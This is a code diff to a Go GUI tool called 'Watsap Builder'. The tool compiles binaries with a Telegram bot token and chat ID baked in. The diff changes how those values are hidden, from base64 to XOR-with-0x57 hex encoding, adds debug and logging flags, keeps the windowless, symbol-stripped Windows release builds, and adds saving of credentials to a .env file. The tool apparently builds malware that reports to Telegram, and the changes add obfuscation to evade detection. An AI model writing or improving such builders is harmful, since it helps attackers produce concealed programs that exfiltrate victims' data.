@@ -1,7 +1,8 @@
 package main
 
 import (
-	"encoding/base64"
+	"encoding/hex"
+	"fmt"
 	"log"
 	"os"
 	"os/exec"
@@ -16,6 +17,14 @@ import (
 	"fyne.io/fyne/v2/layout"
 	"fyne.io/fyne/v2/widget"
 )
+
+func xorHex(input string) string {
+	b := []byte(input)
+	for i := range b {
+		b[i] ^= 0x57
+	}
+	return hex.EncodeToString(b)
+}
 
 func builder(arch string, buildType string, platform string, botToken string, chatID string, output binding.String) {
 	var outputText strings.Builder
@@ -36,15 +45,15 @@ func builder(arch string, buildType string, platform string, botToken string, ch
 		return
 	}
 
-	// Base64 encode variables to match config expectation
-	encodedBotToken := base64.StdEncoding.EncodeToString([]byte(botToken))
-	encodedChatID := base64.StdEncoding.EncodeToString([]byte(chatID))
+	// XOR Hex encode variables to match config expectation (0x57 key)
+	encodedBotToken := xorHex(botToken)
+	encodedChatID := xorHex(chatID)
 
 	// Common flags
-	commonFlags := "-X 'watsap/utils/config.TG_BOT_TOKEN=" + encodedBotToken + "' -X 'watsap/utils/config.TG_CHAT_ID=" + encodedChatID + "'"
-	debugFlags := commonFlags
-	releaseFlags := commonFlags + " -w -s"
-	win_releaseFlags := commonFlags + " -w -s -H=windowsgui"
+	commonFlags := fmt.Sprintf("-X 'watsap/utils/config.TG_BOT_TOKEN_HEX=%s' -X 'watsap/utils/config.TG_CHAT_ID_HEX=%s'", encodedBotToken, encodedChatID)
+	debugFlags := commonFlags + " -X 'watsap/utils/config.DEBUG_STATUS=true' -X 'watsap/utils/config.LOG_STATUS=true'"
+	releaseFlags := commonFlags + " -X 'watsap/utils/config.DEBUG_STATUS=false' -X 'watsap/utils/config.LOG_STATUS=false' -w -s"
+	win_releaseFlags := commonFlags + " -X 'watsap/utils/config.DEBUG_STATUS=false' -X 'watsap/utils/config.LOG_STATUS=false' -w -s -H=windowsgui"
 
 	buildGo := func(goos, goarch, outFile, flags string) error {
 		cmd := exec.Command("go", "build", "-ldflags", flags, "-o", outFile, ".")
@@ -104,6 +113,52 @@ func builder(arch string, buildType string, platform string, botToken string, ch
 	updateOutput("Build complete!")
 }
 
+func getEnvPath() string {
+	if _, err := os.Stat("../.env"); err == nil {
+		return "../.env"
+	}
+	if _, err := os.Stat(".env"); err == nil {
+		return ".env"
+	}
+	if _, err := os.Stat("../watsap"); err == nil {
+		return "../.env"
+	}
+	return ".env"
+}
+
+func loadEnvCredentials() (string, string) {
+	envPath := getEnvPath()
+	data, err := os.ReadFile(envPath)
+	if err != nil {
+		return "", ""
+	}
+
+	var botToken, chatID string
+	lines := strings.Split(string(data), "\n")
+	for _, line := range lines {
+		line = strings.TrimSpace(line)
+		line = strings.TrimPrefix(line, "export ")
+		line = strings.TrimSpace(line)
+
+		if strings.HasPrefix(line, "TG_BOT_TOKEN=") {
+			val := strings.TrimPrefix(line, "TG_BOT_TOKEN=")
+			val = strings.Trim(strings.TrimSpace(val), "\"'")
+			botToken = val
+		} else if strings.HasPrefix(line, "TG_CHAT_ID=") {
+			val := strings.TrimPrefix(line, "TG_CHAT_ID=")
+			val = strings.Trim(strings.TrimSpace(val), "\"'")
+			chatID = val
+		}
+	}
+	return botToken, chatID
+}
+
+func saveEnvCredentials(botToken, chatID string) {
+	envPath := getEnvPath()
+	content := fmt.Sprintf("export TG_BOT_TOKEN=%q\nexport TG_CHAT_ID=%q\n", botToken, chatID)
+	os.WriteFile(envPath, []byte(content), 0644)
+}
+
 func main() {
 	a := app.New()
 	w := a.NewWindow("Watsap Builder")
@@ -125,6 +180,7 @@ A GUI application for building Watsap binaries with custom configurations.
 - Multiple architectures (amd64, 386)
 - Build type selection (Release, Debug)
 - Real-time build logs
+- Persistent .env auto-save
 
 ## Requirements
 - Go compiler
@@ -171,6 +227,16 @@ Built with ♿ using Fyne
 
 	chatIDEntry := widget.NewEntry()
 	chatIDEntry.SetPlaceHolder("Enter chat ID")
+
+	// Load saved credentials from .env if available
+	savedToken, savedID := loadEnvCredentials()
+	if savedToken != "" {
+		botTokenEntry.SetText(savedToken)
+	}
+	if savedID != "" {
+		chatIDEntry.SetText(savedID)
+	}
+
 	logBinding := binding.NewString()
 	logBinding.Set("Build logs will appear here.")
 	logOutput := widget.NewRichTextFromMarkdown("")
@@ -194,17 +260,23 @@ Built with ♿ using Fyne
 
 	// Create build button
 	buildButton := widget.NewButton("Build", func() {
+		token := strings.TrimSpace(botTokenEntry.Text)
+		id := strings.TrimSpace(chatIDEntry.Text)
+
 		// Validate required fields
-		if strings.TrimSpace(botTokenEntry.Text) == "" {
+		if token == "" {
 			dialog.ShowInformation("Error", "Bot Token is required!", w)
 			return
 		}
-		if strings.TrimSpace(chatIDEntry.Text) == "" {
+		if id == "" {
 			dialog.ShowInformation("Error", "Chat ID is required!", w)
 			return
 		}
 
-		go builder(arch, buildType, platform, botTokenEntry.Text, chatIDEntry.Text, logBinding)
+		// Auto-save credentials to .env file for persistence
+		saveEnvCredentials(token, id)
+
+		go builder(arch, buildType, platform, token, id, logBinding)
 	})
 	buildButton.Importance = widget.HighImportance
 
